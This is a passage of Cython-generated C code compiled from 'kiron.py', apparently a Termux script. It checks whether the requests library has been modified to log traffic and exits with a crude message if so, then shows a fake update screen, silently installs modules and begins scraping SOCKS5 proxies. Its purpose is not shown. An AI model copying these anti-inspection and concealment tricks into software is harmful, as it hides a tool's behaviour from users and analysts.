  /* "kiron.py":12
 * import platform
 * import smtplib
 * import math             # <<<<<<<<<<<<<<
 * import os,base64,zlib,pip,urllib
 * first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_math, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_math, __pyx_t_2) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":13
 * import smtplib
 * import math
 * import os,base64,zlib,pip,urllib             # <<<<<<<<<<<<<<
 * first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
 * if not 'print' in open(first+'sessions.py','r').read():
 */
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_base64, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_zlib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zlib, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_pip, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pip, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_urllib, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_urllib, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "kiron.py":14
 * import math
 * import os,base64,zlib,pip,urllib
 * first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"             # <<<<<<<<<<<<<<
 * if not 'print' in open(first+'sessions.py','r').read():
 *     pass
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_first, __pyx_kp_s_data_data_com_termux_files_usr) < 0) __PYX_ERR(0, 14, __pyx_L1_error)

  /* "kiron.py":15
 * import os,base64,zlib,pip,urllib
 * first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
 * if not 'print' in open(first+'sessions.py','r').read():             # <<<<<<<<<<<<<<
 *     pass
 * else:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_first); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_sessions_py); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_3);
  if (__Pyx_PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3)) __PYX_ERR(0, 15, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  if (__Pyx_PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_n_s_r)) __PYX_ERR(0, 15, __pyx_L1_error);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_print, __pyx_t_3, Py_NE)); if (unlikely((__pyx_t_4 < 0))) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_4) {
    goto __pyx_L2;
  }

  /* "kiron.py":18
 *     pass
 * else:
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')             # <<<<<<<<<<<<<<
 * def clear():
 *         os.system('clear')
 */
  /*else*/ {
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__94, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_L2:;

  /* "kiron.py":19
 * else:
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 * os.system('clear')
 */
  __pyx_t_3 = __Pyx_CyFunction_New(&__pyx_mdef_5kiron_1clear, 0, __pyx_n_s_clear, NULL, __pyx_n_s_kiron, __pyx_d, ((PyObject *)__pyx_codeobj__95)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_clear, __pyx_t_3) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":21
 * def clear():
 *         os.system('clear')
 * os.system('clear')             # <<<<<<<<<<<<<<
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')
 * time.sleep(3)
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__96, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":22
 *         os.system('clear')
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')             # <<<<<<<<<<<<<<
 * time.sleep(3)
 * os.system('clear')
 */
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__97, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":23
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')
 * time.sleep(3)             # <<<<<<<<<<<<<<
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__98, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":24
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')
 * time.sleep(3)
 * os.system('clear')             # <<<<<<<<<<<<<<
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 * time.sleep(2)
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__96, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":25
 * time.sleep(3)
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')             # <<<<<<<<<<<<<<
 * time.sleep(2)
 * try:
 */
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__99, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":26
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 * time.sleep(2)             # <<<<<<<<<<<<<<
 * try:
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__100, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":27
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 * time.sleep(2)
 * try:             # <<<<<<<<<<<<<<
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {

      /* "kiron.py":28
 * time.sleep(2)
 * try:
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess             # <<<<<<<<<<<<<<
 *         from string import *
 *         from concurrent.futures import ThreadPoolExecutor as tred
 */
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_requests, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_json, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_time, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_re, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_random, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_sys, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_uuid, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_string, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_string, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_subprocess, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_subprocess, __pyx_t_3) < 0) __PYX_ERR(0, 28, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "kiron.py":29
 * try:
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *             # <<<<<<<<<<<<<<
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:
 */
      __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 29, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_INCREF(__pyx_n_s__93);
      __Pyx_GIVEREF(__pyx_n_s__93);
      if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s__93)) __PYX_ERR(0, 29, __pyx_L3_error);
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_string, __pyx_t_3, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (__pyx_import_star(__pyx_t_2) < 0) __PYX_ERR(0, 29, __pyx_L3_error);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "kiron.py":30
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 *         from concurrent.futures import ThreadPoolExecutor as tred             # <<<<<<<<<<<<<<
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')
 */
      __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);
      __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);
      if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_ThreadPoolExecutor)) __PYX_ERR(0, 30, __pyx_L3_error);
      __pyx_t_3 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_tred, __pyx_t_2) < 0) __PYX_ERR(0, 30, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "kiron.py":27
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 * time.sleep(2)
 * try:             # <<<<<<<<<<<<<<
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":31
 *         from string import *
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:             # <<<<<<<<<<<<<<
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')
 */
    __Pyx_ErrFetch(&__pyx_t_3, &__pyx_t_2, &__pyx_t_7);
    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ModuleNotFoundError); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 31, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_9 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_3, __pyx_t_8);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_ErrRestore(__pyx_t_3, __pyx_t_2, __pyx_t_7);
    __pyx_t_3 = 0; __pyx_t_2 = 0; __pyx_t_7 = 0;
    if (__pyx_t_9) {
      __Pyx_AddTraceback("kiron", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 31, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);

      /* "kiron.py":32
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')             # <<<<<<<<<<<<<<
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AYYUB.py')
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__101, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 32, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "kiron.py":33
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')             # <<<<<<<<<<<<<<
 *         os.system('python AYYUB.py')
 * except:pass
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 33, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 33, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_tuple__102, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 33, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "kiron.py":34
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AYYUB.py')             # <<<<<<<<<<<<<<
 * except:pass
 * ###----------[ GET PROXY ]----------###
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 34, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 34, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_tuple__103, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 34, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L4_exception_handled;
    }

    /* "kiron.py":35
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AYYUB.py')
 * except:pass             # <<<<<<<<<<<<<<
 * ###----------[ GET PROXY ]----------###
 * redmi=[]
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }

    /* "kiron.py":27
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 * time.sleep(2)
 * try:             # <<<<<<<<<<<<<<
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_5, __pyx_t_6);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_5, __pyx_t_6);
    __pyx_L8_try_end:;
  }

  /* "kiron.py":37
 * except:pass
 * ###----------[ GET PROXY ]----------###
 * redmi=[]             # <<<<<<<<<<<<<<
 * try:
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 */
  __pyx_t_3 = PyList_New(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_redmi, __pyx_t_3) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "kiron.py":38
 * ###----------[ GET PROXY ]----------###
 * redmi=[]
 * try:             # <<<<<<<<<<<<<<
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 *  open('.proxy.txt','w').write(uno)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "kiron.py":39
 * redmi=[]
 * try:
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text             # <<<<<<<<<<<<<<
 *  open('.proxy.txt','w').write(uno)
 * except:pass
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_ses); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 39, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__104, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 39, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
